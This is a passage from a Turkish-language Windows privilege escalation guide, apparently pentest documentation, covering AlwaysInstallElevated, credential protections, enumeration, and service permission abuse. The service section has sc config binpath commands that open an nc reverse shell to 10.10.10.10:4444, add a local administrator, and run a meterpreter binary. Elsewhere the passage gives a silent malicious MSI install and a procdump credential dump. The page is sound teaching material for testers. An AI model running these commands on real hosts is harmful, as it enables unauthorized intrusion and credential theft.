- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** **arka planda** çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu zafiyeti exploit etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Detectors

### Denetim Ayarları

Bu ayarlar neyin **loglandığını** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding ile logların nereye gönderildiğini öğrenmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır; her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinler verilmiş kullanıcılar tarafından erişilebilir. Böylece yetkili kullanıcılar yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sisteme yönelik güvenliği daha da artırmak için güvenilmeyen işlemlerin Local Security Authority (LSA) belleğini **okumasını** veya kod enjekte etmesini **engellemek** üzere LSA için gelişmiş koruma sunmuştur.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıklarınızı yükseltmek için bunların nasıl kötüye kullanılacağı hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlgi çekici token'lar** ve bunların nasıl kötüye kullanılacağı hakkında bilgi edinmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan bir binary'nin **üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; yetkileri yükseltmek için bunlardan yararlanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port taramasında görünmemesi, daha önce hiç erişime açık olmadığını kanıtlamaz. Gözlemlenen listener'ları PID'si, süreç sahibi ve düşük ayrıcalıklı kullanıcının listener'a erişip erişemediğiyle ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arasında kod yürütülebileceğini kanıtlamaz. Rutin enumeration işlemlerini pasif tutun ve debugger komutları göndermeyin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**İşlem ikililerinin bulunduğu klasörlerin izinlerini denetleme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, yapılandırmada `dynamicpreprocessor directory` ile belirtilen paylaşımlı kitaplıkları, `snort.exe -c <config>` ile seçilen yapılandırmadan yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış bir görev veya hizmet için tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa görev veya hizmet modülleri bir sonraki yüklediğinde kod yürütme açısından incelenmeye değer bir yol söz konusu olabilir. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm deny veya paylaşım kısıtlamalarını doğrulayın; tek başına yazılabilir bir dizin ayrıcalık yükseltmesini kanıtlamaz. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) çalışma zamanı modül yüklemesini açıklar.

### Yazılabilir bir belge kök dizinine sahip ayrıcalıklı web hizmeti

Bir Windows Apache kurulumunda, hizmetin yürütülebilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Alışılagelmiş bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kök dizininin (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu kök dizinde dosya oluşturabiliyorsa, sunucu tarafı kod yürütme ana makinedeki ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam yolun sunulduğunu ve sunucu tarafı bir işleyicinin dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök dizin yalnızca dosya oluşturulabildiğini kanıtlar. Sınama dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For a conventional WAMP kurulumu, hizmet sürüm numarası içeren `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yolunu gösterebilir (32 bit düzeninde `C:\wamp\...`); yapılandırma da bunun yanında, `conf\httpd.conf` altında bulunur ve varsayılan kök dizin `C:\wamp64\www` veya `C:\wamp\www` olur. Hizmetin tam imaj yolunu, çalıştırıldığı hesabı, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dâhil) ve kök dizinin ACL'sini birlikte denetleyin. WAMP dizininin yazılabilir olması, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS için, `applicationHost.config` içindeki yazılabilir bir fiziksel dizini **etkin bir site/uygulama** ile eşleştirin, ardından yapılandırılmış havuzunu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve rotaya erişilebiliyorsa havuz olarak çalışır. Yazılabilir bir dizini kod çalıştırma olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yol başına geçersiz kılmaları denetleyin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizinindeki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodunu değiştirebiliyorsa, uygulamanın bunu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod çalıştırıldığını kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, süreç kimliği ve olası yeniden derlemenin zamanlamasıyla ilişkilendirin. Salt okunur meta veri incelemesi yapın; sayım sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile, genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu bunun yerine yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Atlanmış bir kimlik ayarı, IIS sürümleri arasında farklılık gösteren havuz varsayılanlarını devralabilir; bu nedenle havuz adından tahmin etmek yerine etkin yapılandırmayı çözümleyin. Kod çalıştırma, bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **belirli bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına makine hesabı bileti veya ana bilgisayar rolü bu hakların varlığını kanıtlamaz. Pasif sayım, dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL'leri incelemelidir.

Yardımcı bir süreç başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen her değeri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Kod çözülmüş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk meta karakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd`'nin özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın kodu çözülmüş değeri gerçekten etkileyebildiğini ve işleyiciye ulaşabildiğini doğrulayın; ardından etkin uygulama havuzu veya taklit edilen kimliği ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak kodu satırı, localhost dinleyicisi veya token biçimindeki bir zafiyet tek başına ayrıcalıklı komut çalıştırıldığını kanıtlamaz. Pasif sayım sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodunu ve havuz yapılandırmasını inceleyin.

Windows üzerinde çalışan bir PHP hizmetinde, [`include` veya `require`](https://www.php.net/manual/en/function.include.php) ifadesine aktarılan, istek tarafından denetlenen bir yol; düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı belirttiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Loopback dinleyicisi veya yazılabilir dosya tek başına bu zinciri kanıtlamaz; pasif sayım sırasında uç noktayı çağırmadan kaynak kodunu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

**procdump** from sysinternals kullanarak çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, kullanıcının bir CMD açmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" ifadesini arayın ve "Click to open Command Prompt" seçeneğine tıklayın.

### Ayrıcalıklı proje dosyası içe aktarma

Düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcının derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML external entity'lere izin veriyordu; Windows'ta bir ağ entity'si, [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarıcı hesabından kimlik doğrulamaya neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkabileceğine dair bir ipucudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı ve yetkili ya da savunmasız bir yol üzerinden kullanılabilir olması gerekir ve mevcut derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif envanter çıkarırken hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) inceleme için bir ipucudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService`, bir handle döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu handle, oluşturma sırasında istenen hizmet erişim haklarına sahiptir. Hizmeti daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve ilk handle kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, hizmet hesabını, başlatma ilkesini ve çalıştırılabilir dosya yolunu ayrı ayrı doğrulayın. Pasif envanter çıkarırken hizmet oluşturmayın veya başlatmayın.

Uzak bir hizmet yükleme yolu için, bu SCM haklarını hedefte **aynı ağ oturum açma hesabının** yazabildiği bir paylaşımla, paylaşımın dayandığı NTFS ACL ile ve hizmet hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yoluyla ilişkilendirin. Alışılmadık ölçüde geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetici paylaşımı zorunlu değildir. Yalnızca paylaşıma yazma erişimi veya yalnızca hizmet oluşturma hakkına dair bir SCM ipucu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir hizmet, bu yardımcı dosya `ImagePath` içinde yer almasa bile başlatma, kapatma veya başka bir yaşam döngüsü olayı sırasında bir yardımcı çalıştırılabilir dosyayı çağırabilir. Yardımcı dosya adı, düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde aranıyor ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yükleyeceğini göstermez; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` işlevine argüman sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Başlatma erişimini bir denetim hakkından fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir argümanı günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, argümandan yazmaya giden kesin akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korunan bir dizine yazma, yalnızca ayrıcalıklı bir tüketici veya yükleyici bu dosyayı kabul ediyorsa ayrıcalık yükseltmeye dönüşebilir; yazılabilir bir günlük dosyası veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme ipucudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı çalıştırma için ek olarak `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), bir komutu kaydetme ya da değiştirme konusunda geçerli bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback üzerinde dinleyen bir porta yerel bir kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakları kanıtlamaz. Pasif envanter sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenlik yönergeleri](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmette, hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini hizmetin güven sınırının tamamı olarak değerlendirmeden önce alt çalıştırılabilir dosyayı ve üst dizininin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme ipucudur: düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, tam olarak hangi işlemin bu kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, bir endpoint URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif envanter sırasında hizmet işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için, çağıran tarafından denetlenen bir dizenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows taşıma kimlik bilgileri kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** bir işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek bir hizmet kimliği altında `AddScript`'e uzanan yol, bir kod çalıştırma sınırıdır; dinleme yapan bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir assembly'deki kullanılmayan bir yöntem tek başına kanıt değildir. Envanter sırasında endpoint'i çağırmadan dağıtılmış hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlantısı, GPO yenilemesi vb.) oluştuğunda Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmadan bile tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Envanter ve etkinleştirme teknikleri için buraya bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), bir junction ve object-manager-link yarış durumu kullanarak hizmetin DACL sıfırlama işlemini yönlendirdi. Gösterilen ayrıcalık yükseltme yöntemi ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşen Ocak 2024'te düzeltildi.

Pasif ön inceleme için, yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme için hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** binary’sinin kullanılması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir servisi değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya kendisiyle ilişkili etkin bir cihaz yok._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**XP SP1 için upnphost hizmetinin çalışması SSDPSRV'ye bağlıdır**

**Bu sorun için başka bir geçici çözüm** şu komutu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve servis yapılandırmalarını değiştirme olanağı verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yetkisini de sağlar.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme yetkisini de sağlar.

Bu güvenlik açığını tespit etmek ve exploit etmek için _exploit/windows/local/service_permissions_ kullanılabilir.

### Zayıf izinlere sahip servis binary'leri

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar servis EXE'sini veya üst klasörünü değiştirebiliyorsa**, çoğu zaman **binary değiştirilip servis yeniden başlatılarak** servis ele geçirilebilir.

**Bir servis tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi** veya binary'nin bulunduğu **klasör üzerinde yazma izinleriniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm binary'leri **wmic** kullanarak alabilir (system32 içinde olmayanları) ve **icacls** kullanarak izinlerinizi kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet çalıştırılabilir dosyasında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve çalıştırılabilir dosyanın yolunu doğrulayın.
2. `icacls <path>` ile ikili dosyanın yazılabilir olduğunu doğrulayın.
